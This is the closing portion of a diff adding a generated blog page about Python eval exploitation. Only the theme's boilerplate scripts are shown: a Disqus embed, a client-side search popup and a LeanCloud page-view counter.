+        var disqus_config = function () {
+          this.page.url = 'http://yoursite.com/2015/07/31/Python eval的常见错误封装及利用原理/';
+          this.page.identifier = '2015/07/31/Python eval的常见错误封装及利用原理/';
+          this.page.title = 'Python eval的常见错误封装及利用原理';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://xxlegend-com.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      $('#local-search-input').focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("rAO8AHWqEz3IlgcuNBzFXyK3-gzGzoHsz", "LI2NyeVIf9NiHynChn0UrBCl");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
